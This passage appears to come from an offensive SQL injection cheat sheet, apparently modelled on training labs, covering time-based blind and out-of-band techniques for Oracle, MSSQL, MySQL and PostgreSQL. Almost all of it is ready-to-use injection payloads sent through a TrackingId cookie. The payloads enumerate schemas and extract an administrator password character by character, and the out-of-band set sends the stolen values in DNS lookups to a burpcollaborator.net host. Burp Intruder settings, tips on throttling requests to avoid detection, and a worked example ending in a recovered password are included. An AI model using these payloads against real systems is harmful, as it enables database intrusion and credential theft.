TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+users+WHERE+user='administrator'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Test if any admin user exists
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+users+WHERE+username+LIKE+'%admin%'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

---

## **Step 6: Find Password Column**

### **Test Common Password Column Names**

#### **All Databases:**
```sql
-- Test if 'password' column exists in users table
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+information_schema.columns+WHERE+table_name='users'+AND+column_name='password'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Test if 'pass' column exists
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+information_schema.columns+WHERE+table_name='users'+AND+column_name='pass'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Test if 'pwd' column exists
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+information_schema.columns+WHERE+table_name='users'+AND+column_name='pwd'))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

---

## **Step 7: Extract Password Length**

### **Determine Password Length**

#### **PostgreSQL:**
```sql
-- Test password length > 1
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- Test password length > 2
TrackingId=x'%3BSELECT+CASE+WHEN+(EXISTS(SELECT+1+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>2))+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

#### **MySQL:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+((SELECT+LENGTH(password)+FROM+users+WHERE+username='administrator')>1)+THEN+sleep(10)+ELSE+sleep(0)+END--
```

#### **Microsoft SQL Server:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+((SELECT+LEN(password)+FROM+users+WHERE+username='administrator')>1)+THEN+WAITFOR+DELAY+'0:0:10'+ELSE+WAITFOR+DELAY+'0:0:0'+END--
```

#### **Oracle:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+((SELECT+LENGTH(password)+FROM+users+WHERE+username='administrator')>1)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+dbms_pipe.receive_message(('a'),0)+END+FROM+dual--
```

---

## **Step 8: Extract Password Character by Character**

### **Final Password Extraction**

#### **PostgreSQL:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

#### **MySQL:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='§a§')+THEN+sleep(10)+ELSE+sleep(0)+END--
```

#### **Microsoft SQL Server:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='§a§')+THEN+WAITFOR+DELAY+'0:0:10'+ELSE+WAITFOR+DELAY+'0:0:0'+END--
```

#### **Oracle:**
```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='§a§')+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+dbms_pipe.receive_message(('a'),0)+END+FROM+dual--
```

---

## **Complete Discovery Workflow**

### **Step-by-Step Process for Unknown Schema:**

1. **Database Fingerprinting**
   - Identify database type using version functions
   - Confirm with database-specific syntax

2. **Table Discovery**
   - Extract all table names from information schema
   - Look for user-related tables (users, admin, accounts)
   - Extract table names character by character

3. **Column Discovery**
   - Extract all columns from target table
   - Look for username/password columns
   - Extract column names character by character

4. **User Verification**
   - Confirm administrator user exists
   - Test common username variations

5. **Password Column Identification**
   - Find password column in users table
   - Test common password column names

6. **Password Length Discovery**
   - Determine password length incrementally
   - Find exact character count

7. **Password Extraction**
   - Extract password character by character
   - Use Burp Intruder with single threading

---

## **Burp Suite Configuration for Schema Discovery**

### **Table/Column Discovery Settings:**
- **Attack Type:** Cluster Bomb
- **Payload Set 1:** Positions 1-50 (character positions)
- **Payload Set 2:** OFFSET values 0-50 (table/column indexes)
- **Payload Set 3:** Characters a-z, 0-9, _
- **Resource Pool:** Maximum concurrent requests = 1

### **Payload Positions:**
```sql
-- For table discovery
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+LIMIT+1+OFFSET+§0§),§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

-- For column discovery  
TrackingId=x'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'+LIMIT+1+OFFSET+§0§),§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

---

## **Automated Discovery Script Concept**

```python
# Pseudo-code for automated schema discovery
def discover_schema():
    # Step 1: Identify database type
    db_type = identify_database()
    
    # Step 2: Extract table names
    tables = extract_tables(db_type)
    
    # Step 3: Find users table
    users_table = find_users_table(tables)
    
    # Step 4: Extract columns from users table
    columns = extract_columns(db_type, users_table)
    
    # Step 5: Find username and password columns
    username_col = find_username_column(columns)
    password_col = find_password_column(columns)
    
    # Step 6: Extract administrator password
    password = extract_password(db_type, users_table, username_col, password_col)
    
    return password
```

---

## **Optimization Strategies**

1. **Prioritize Common Names:** Test 'users', 'admin' tables first
2. **Binary Search:** Use range testing for faster discovery
3. **Pattern Matching:** Look for tables with 'user', 'auth', 'account' patterns
4. **Parallel Processing:** Use multiple positions for different discovery stages
5. **Caching:** Store discovered schema to avoid re-extraction

---

## **Time Estimates**

| Step | Estimated Time (Manual) | Estimated Time (Automated) |
|------|-------------------------|----------------------------|
| Database Fingerprinting | 1-2 minutes | 30 seconds |
| Table Discovery | 10-30 minutes | 2-5 minutes |
| Column Discovery | 5-15 minutes | 1-3 minutes |
| Password Extraction | 20-60 minutes | 5-15 minutes |
| **Total** | **36-107 minutes** | **8-23 minutes** |

This comprehensive guide enables complete database schema discovery and password extraction using only time-based blind SQL injection, even when starting with zero knowledge of the database structure.

# Complete OAST SQL Injection Workflow - Unknown Environment
*Full Discovery to Data Extraction for All 4 Databases*

## 🎯 Overall Strategy

**When you know NOTHING:**
1. **Detect Database Type** → 2. **Find Version** → 3. **Enumerate Tables** → 4. **Enumerate Columns** → 5. **Extract Data**

---

## 🗃️ Oracle - Complete Unknown Environment

### Step 1: Detect Database Type
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://oracle-§1§.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
**Payload:** `confirmed`

### Step 2: Get Version Information
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT banner FROM v$version WHERE rownum=1)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

### Step 3: Find All Table Names
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT table_name FROM (SELECT table_name,rownum as r FROM all_tables) WHERE r=§1§)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
**Intruder Payload:** Numbers 1-100

### Step 4: Find Column Names in Target Table
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT column_name FROM (SELECT column_name,rownum as r FROM all_tab_columns WHERE table_name='USERS') WHERE r=§1§)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
**Intruder Payload:** Numbers 1-20

### Step 5: Extract Usernames
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT username FROM (SELECT username,rownum as r FROM users) WHERE r=§1§)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
**Intruder Payload:** Numbers 1-50

### Step 6: Extract Passwords Character by Character
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT SUBSTR(password,§1§,1) FROM users WHERE username='administrator')||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
**Intruder Payload:** Numbers 1-30

---

## 🗃️ Microsoft SQL Server - Complete Unknown Environment

### Step 1: Detect Database Type
```sql
TrackingId=x'; EXEC master..xp_dirtree '\\\\mssql-§1§.abc123.burpcollaborator.net\\test'--
```
**Payload:** `confirmed`

### Step 2: Get Version Information
```sql
TrackingId=x'; DECLARE @v VARCHAR(100); SET @v=(SELECT @@version); EXEC('xp_dirtree ''\\\\'+@v+'.abc123.burpcollaborator.net\\test''')--
```

### Step 3: Find All Table Names
```sql
TrackingId=x'; DECLARE @t VARCHAR(100); SET @t=(SELECT table_name FROM (SELECT table_name,ROW_NUMBER() OVER(ORDER BY table_name) as r FROM information_schema.tables) t WHERE r=§1§); EXEC('xp_dirtree ''\\\\'+@t+'.abc123.burpcollaborator.net\\test''')--
```
**Intruder Payload:** Numbers 1-100

### Step 4: Find Column Names in Target Table
```sql
TrackingId=x'; DECLARE @c VARCHAR(100); SET @c=(SELECT column_name FROM (SELECT column_name,ROW_NUMBER() OVER(ORDER BY column_name) as r FROM information_schema.columns WHERE table_name='users') t WHERE r=§1§); EXEC('xp_dirtree ''\\\\'+@c+'.abc123.burpcollaborator.net\\test''')--
```
**Intruder Payload:** Numbers 1-20

### Step 5: Extract Usernames
```sql
TrackingId=x'; DECLARE @u VARCHAR(100); SET @u=(SELECT username FROM (SELECT username,ROW_NUMBER() OVER(ORDER BY username) as r FROM users) t WHERE r=§1§); EXEC('xp_dirtree ''\\\\'+@u+'.abc123.burpcollaborator.net\\test''')--
```
**Intruder Payload:** Numbers 1-50

### Step 6: Extract Passwords Character by Character
```sql
TrackingId=x'; DECLARE @p VARCHAR(100); SET @p=(SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator'); EXEC('xp_dirtree ''\\\\'+@p+'.abc123.burpcollaborator.net\\test''')--
```
**Intruder Payload:** Numbers 1-30

---

## 🗃️ MySQL - Complete Unknown Environment

### Step 1: Detect Database Type
```sql
TrackingId=x' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version_comment,'.abc123.burpcollaborator.net\\test')))--
```

### Step 2: Get Version Information
```sql
TrackingId=x' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.abc123.burpcollaborator.net\\test')))--
```

### Step 3: Find All Table Names
```sql
TrackingId=x' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT §1§,1),'.abc123.burpcollaborator.net\\test')))--
```
**Intruder Payload:** Numbers 0-99 (LIMIT offset,1)

### Step 4: Find Column Names in Target Table
```sql
TrackingId=x' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT §1§,1),'.abc123.burpcollaborator.net\\test')))--
```
**Intruder Payload:** Numbers 0-19

### Step 5: Extract Usernames
```sql
TrackingId=x' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT username FROM users LIMIT §1§,1),'.abc123.burpcollaborator.net\\test')))--
```
**Intruder Payload:** Numbers 0-49

### Step 6: Extract Passwords Character by Character
```sql
TrackingId=x' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator'),'.abc123.burpcollaborator.net\\test')))--
```
**Intruder Payload:** Numbers 1-30

---

## 🗃️ PostgreSQL - Complete Unknown Environment

### Step 1: Detect Database Type
```sql
TrackingId=x'; SELECT * FROM dblink('host=postgres-§1§.abc123.burpcollaborator.net user=x password=x dbname=x', 'SELECT 1') AS t(a TEXT)--
```
**Payload:** `confirmed`

### Step 2: Get Version Information
```sql
TrackingId=x'; SELECT * FROM dblink('host='||(SELECT version())||'.abc123.burpcollaborator.net', 'SELECT 1') AS t(a TEXT)--
```

### Step 3: Find All Table Names
```sql
TrackingId=x'; SELECT * FROM dblink('host='||(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET §1§)||'.abc123.burpcollaborator.net', 'SELECT 1') AS t(a TEXT)--
```
**Intruder Payload:** Numbers 0-99

### Step 4: Find Column Names in Target Table
```sql
TrackingId=x'; SELECT * FROM dblink('host='||(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET §1§)||'.abc123.burpcollaborator.net', 'SELECT 1') AS t(a TEXT)--
```
**Intruder Payload:** Numbers 0-19

### Step 5: Extract Usernames
```sql
TrackingId=x'; SELECT * FROM dblink('host='||(SELECT username FROM users LIMIT 1 OFFSET §1§)||'.abc123.burpcollaborator.net', 'SELECT 1') AS t(a TEXT)--
```
**Intruder Payload:** Numbers 0-49

### Step 6: Extract Passwords Character by Character
```sql
TrackingId=x'; SELECT * FROM dblink('host='||(SELECT SUBSTRING(password FROM §1§ FOR 1) FROM users WHERE username='administrator')||'.abc123.burpcollaborator.net', 'SELECT 1') AS t(a TEXT)--
```
**Intruder Payload:** Numbers 1-30

---

## 🛠️ Burp Suite Professional Setup

### Step 1: Initial Database Detection

**Create 4 separate intruder attacks - one for each DB type:**

**Attack 1 - Oracle Detection:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://oracle-test.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

**Attack 2 - MSSQL Detection:**
```http
Cookie: TrackingId=x'; EXEC master..xp_dirtree '\\\\mssql-test.abc123.burpcollaborator.net\\test'--
```

**Attack 3 - MySQL Detection:**
```http
Cookie: TrackingId=x' AND (SELECT LOAD_FILE(CONCAT('\\\\',@@version_comment,'.abc123.burpcollaborator.net\\test')))--
```

**Attack 4 - PostgreSQL Detection:**
```http
Cookie: TrackingId=x'; SELECT * FROM dblink('host=postgres-test.abc123.burpcollaborator.net user=x password=x dbname=x', 'SELECT 1') AS t(a TEXT)--
```

**Monitor Collaborator to see which one triggers!**

### Step 2: Automated Table Enumeration

**Once DB type confirmed, run table enumeration:**

**Oracle Table Enumeration Intruder:**
```http
Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT table_name FROM (SELECT table_name,rownum as r FROM all_tables) WHERE r=§1§)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
- **Payload:** Numbers 1-200
- **Resource pool:** Add 10ms delay between requests

**Look for tables like:** `USERS`, `ADMIN`, `CUSTOMERS`, `ACCOUNTS`

### Step 3: Column Enumeration

**Found USERS table? Now find columns:**

**Oracle Column Enumeration:**
```http
Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT column_name FROM (SELECT column_name,rownum as r FROM all_tab_columns WHERE table_name='USERS') WHERE r=§1§)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
- **Payload:** Numbers 1-15

**Look for columns like:** `USERNAME`, `PASSWORD`, `PASSWD`, `PASS`, `EMAIL`

### Step 4: Username Enumeration

**Oracle Username Extraction:**
```http
Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT username FROM (SELECT username,rownum as r FROM users) WHERE r=§1§)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
- **Payload:** Numbers 1-50

**Look for:** `administrator`, `admin`, `root`, etc.

### Step 5: Password Extraction

**Oracle Password Character Extraction:**
```http
Cookie: TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT SUBSTR(password,§1§,1) FROM users WHERE username='administrator')||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
- **Payload:** Numbers 1-40

---

## 📊 Real-World Example Walkthrough

### Scenario: Unknown Oracle Database

**Step 1 - Detection:**
```sql
-- Send Oracle payload
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://oracle-confirmed.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
**Result:** DNS query received! → **Oracle confirmed**

**Step 2 - Version:**
```sql
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT banner FROM v$version WHERE rownum=1)||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```
**Result:** `Oracle Database 11g Enterprise Edition.abc123.burpcollaborator.net`

**Step 3 - Table Enumeration (Intruder positions 1-50):**
```
Position 1: PRODUCTS.abc123.burpcollaborator.net
Position 2: CATEGORIES.abc123.burpcollaborator.net  
Position 3: USERS.abc123.burpcollaborator.net  ← Target!
Position 4: ORDERS.abc123.burpcollaborator.net
...
```

**Step 4 - Column Enumeration (Intruder positions 1-10):**
```
Position 1: ID.abc123.burpcollaborator.net
Position 2: USERNAME.abc123.burpcollaborator.net  ← Target!
Position 3: PASSWORD.abc123.burpcollaborator.net  ← Target!
Position 4: EMAIL.abc123.burpcollaborator.net
...
```

**Step 5 - Username Enumeration (Intruder positions 1-10):**
```
Position 1: guest.abc123.burpcollaborator.net
Position 2: admin.abc123.burpcollaborator.net
Position 3: administrator.abc123.burpcollaborator.net  ← Target!
Position 4: test.abc123.burpcollaborator.net
...
```

**Step 6 - Password Extraction (Intruder positions 1-20):**
```
Position 1: s.abc123.burpcollaborator.net
Position 2: 3.abc123.burpcollaborator.net
Position 3: c.abc123.burpcollaborator.net
Position 4: r.abc123.burpcollaborator.net
...
Position 20: $.abc123.burpcollaborator.net
```

**Final Password:** `s3cretp@ssw0rd!123$`

---

## 🔧 Advanced Techniques for Unknown Environments

### Smart Table Discovery
```sql
-- Look for common table patterns
-- Oracle
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT table_name FROM all_tables WHERE table_name LIKE '%USER%' OR table_name LIKE '%ACCOUNT%' OR table_name LIKE '%ADMIN%' OR table_name LIKE '%PASS%' OR table_name LIKE '%CRED%' OR table_name LIKE '%AUTH%' OR table_name LIKE '%LOGIN%' OR table_name='USERS' OR table_name='USER' OR table_name='ADMIN' OR table_name='ADMINS')||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

### Common Column Patterns
```sql
-- Look for password columns
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT column_name FROM all_tab_columns WHERE table_name='USERS' AND (column_name LIKE '%PASS%' OR column_name LIKE '%PWD%' OR column_name='PASSWORD' OR column_name='PASS' OR column_name='PASSWD'))||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

### Username Guessing
```sql
-- Common admin usernames
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT username FROM users WHERE username IN ('admin','administrator','root','sys','system','superuser','super'))||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

---

## 🚀 Automation Tips

### Resource Pool Configuration
- **Set 50-100ms delay** between requests to avoid detection
- **Use maximum 5 concurrent requests**
- **Monitor server responses** for errors

### Collaborator Management
- **Use different subdomains** for each phase
- **Take screenshots** of Collaborator results
- **Export Collaborator data** for documentation

### Error Handling in Payloads
```sql
-- Oracle with NULL handling
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||NVL((SELECT table_name FROM (SELECT table_name,rownum as r FROM all_tables) WHERE r=§1§),'null')||'.abc123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

This complete workflow takes you from zero knowledge to full credential extraction across all major databases using OAST techniques with Burp Suite automation.
